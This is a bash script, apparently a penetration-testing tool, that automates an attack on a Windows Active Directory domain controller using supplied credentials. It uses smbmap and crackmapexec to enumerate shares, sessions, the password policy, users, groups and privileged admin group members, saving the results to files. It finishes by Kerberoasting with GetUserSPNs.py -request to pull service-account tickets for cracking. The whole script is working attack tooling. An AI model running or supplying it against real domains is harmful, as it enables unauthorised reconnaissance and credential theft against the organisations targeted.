#!/bin/bash
echo -e "\n\e[1;38m EXPLOIT-THE-DIRECTOR\e[0m"
read -p "Enter in the IP Address of the target Domain Controller: " dc_ip
read -p "Enter in the domain name (ex. domain.local): " dname
read -p "Enter in the username: (ex. jsmith): " user
read -p "Enter in the password: " pass

##############
#CRACKMAPEXEC#
##############

echo "Testing Credential..."
valid_creds=$(smbmap -d $dname -u $user -p $pass -H $dc_ip | grep +)
if [[ "$valid_creds" = *"+"* ]]
then 	echo "Credentilas are valid, program  will continue"
else
	echo "Credentials testing was unsuccessful when tested through smbmap, credentials could be invalid, exiting script to avoid potential lock outs"
	exit
fi

echo -e "Listing SMB shares available using crackmapexec & smbmap, WILL NOT LIST SHARES IF YOU RUN AS SUDO ROOT!"
crackmapexec smb $dc_ip -u $user -p $pass --shares 2>/dev/null
smbmap -d $dname -u $user -p $pass -H $dc_ip 
smbmap -d $dname -u $user -p $pass -H $dc_ip > shares.txt

echo -e "Listing SMB sessions using crackmapexec"
crackmapexec smb $dc_ip -u $user -p $pass --sessions

echo -e "Listing Password Policy"
crackmapexec smb $dc_ip -u $user -p $pass --pass-pol
crackmapexec smb $dc_ip -u $user -p $pass --pass-pol > password_policy.txt
echo -e "Listing Users Logged-on currently"
crackmapexec smb $dc_ip -u $user -p $pass --loggedon-users

echo -e "Listing Domain Users using crackmapexec"
crackmapexec smb $dc_ip -u $user -p $pass --users 
crackmapexec smb $dc_ip -u $user -p $pass --users > domain_users.txt

echo -e "Listing Domain Groups using crackmapexec ldap"
crackmapexec ldap $dc_ip -u $user -p $pass --kdcHost $dc_ip --users 
crackmapexec ldap $dc_ip -u $user -p $pass --kdcHost $dc_ip --users > domain_groups.txt

echo -e "Listing Domain Groups using crackmapexec smb"
crackmapexec smb $dc_ip -u $user -p $pass --groups
crackmapexec smb $dc_ip -u $user -p $pass --groups >> domain_groups.txt

echo -e "Listing Domain Groups using crackmapexec ldap"
crackmapexec ldap $dc_ip -u $user -p $pass --kdcHost $dc_ip --groups
crackmapexec ldap $dc_ip -u $user -p $pass --kdcHost $dc_ip --groups > local_groups.txt

echo -e "Listing Local Groups using crackmapexec smb"
crackmapexec smb $dc_ip -u $user -p $pass --local-groups
crackmapexec smb $dc_ip -u $user -p $pass --local-groups >> local_groups.txt

echo -e "Listing Admin Groups using crackmapexec ldap"
crackmapexec ldap $dc_ip -u $user -p $pass --kdcHost $dc_ip --admin-count

echo -e "Listing members of Domain Admins using crackmapexec"
crackmapexec smb $dc_ip -u $user -p $pass --groups "Domain Admins"
crackmapexec smb $dc_ip -u $user -p $pass --groups "Domain Admins" > domain_admins.txt

echo -e "Listing members of Enterprise Admins using crackmapexec"
crackmapexec smb $dc_ip -u $user -p $pass --groups "Enterprise Admins"
crackmapexec smb $dc_ip -u $user -p $pass --groups "Enterprise Admins" > enterprise_admins.txt

echo -e "Listing members of Schema Admins using crackmapexec"
crackmapexec smb $dc_ip -u $user -p $pass --groups "Schema Admins"
crackmapexec smb $dc_ip -u $user -p $pass --groups "Schema Admins" > schema_admins.txt

echo -e "Listing members of Adminsitrators using crackmapexec"
crackmapexec smb $dc_ip -u $user -p $pass --groups "Administrators"
crackmapexec smb $dc_ip -u $user -p $pass --groups "Administrators" > administrators.txt

#############
#GetUserSPNs#
#############

echo "Querying Service Account Principal Names with GetUserSPNs.py"
GetUserSPNs.py $dname/$user:$pass -dc-ip $dc_ip -request
GetUserSPNs.py $dname/$user:$pass -dc-ip $dc_ip -request > userspns.txt